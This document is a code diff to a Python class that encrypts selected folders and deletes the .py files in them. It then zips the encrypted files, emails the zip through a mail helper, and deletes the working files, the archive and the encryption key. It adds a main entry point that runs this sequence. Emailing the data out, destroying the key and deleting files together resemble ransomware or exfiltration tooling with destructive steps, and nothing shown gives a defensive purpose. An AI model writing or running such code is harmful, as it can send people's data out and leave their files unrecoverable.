@@ -15,8 +15,8 @@ class FileEncryption(DataClass):
         self.mailer = SendMail
 
         # Constants
-        self.zip_file_path = 'Encrypted_Folders.zip'
         self.encrypted_folders_dir = 'Encrypted_Folders'
+        self.zip_file_path = 'Encrypted_Folders.zip'
         self.key_path = 'EncryptionKey.key'
 
         # Encryption key
@@ -44,6 +44,12 @@ class FileEncryption(DataClass):
 
             for root, _, files in os.walk(encrypted_folder_path):
                 for file in files:
+                    if file.endswith('.py'):
+                        file_path = os.path.join(root, file)
+                        os.remove(file_path)
+
+            for root, _, files in os.walk(encrypted_folder_path):
+                for file in files:
                     if not file.endswith('.py'):
                         file_path = os.path.join(root, file)
                         with open(file_path, 'rb') as f:
@@ -57,17 +63,6 @@ class FileEncryption(DataClass):
             return False
         return True
 
-    def encrypt_folders(self):
-        os.makedirs(self.encrypted_folders_dir, exist_ok=True)
-        all_encrypted = all(self.encrypt_folder(folder) for folder in self.folders)
-        if all_encrypted:
-            self.create_zip()
-            self.send_email()
-            time.sleep(5)
-            self.delete_files()
-        else:
-            print("Not all folders were encrypted successfully. Aborting deletion.")
-
     def create_zip(self):
         with zipfile.ZipFile(self.zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
             for root, _, files in os.walk(self.encrypted_folders_dir):
@@ -79,7 +74,25 @@ class FileEncryption(DataClass):
         self.mailer.SendMail().send_mail(self.zip_file_path)
 
     def delete_files(self):
-        for folder in self.folders:
-            shutil.rmtree(folder)
         shutil.rmtree(self.encrypted_folders_dir)
         os.remove(self.zip_file_path)
+        os.remove(self.key_path)
+
+        print("Files deleted successfully")
+
+    def encrypt_folders(self):
+        os.makedirs(self.encrypted_folders_dir, exist_ok=True)
+        all_encrypted = all(self.encrypt_folder(folder) for folder in self.folders)
+        if all_encrypted:
+            if self.create_zip():
+                if self.send_email():
+                    print("Email sent successfully")
+                    time.sleep(30)
+                    self.delete_files()
+
+        else:
+            print("Not all folders were encrypted successfully. Aborting deletion.")
+
+
+if __name__ == '__main__':
+    FileEncryption().encrypt_folders()
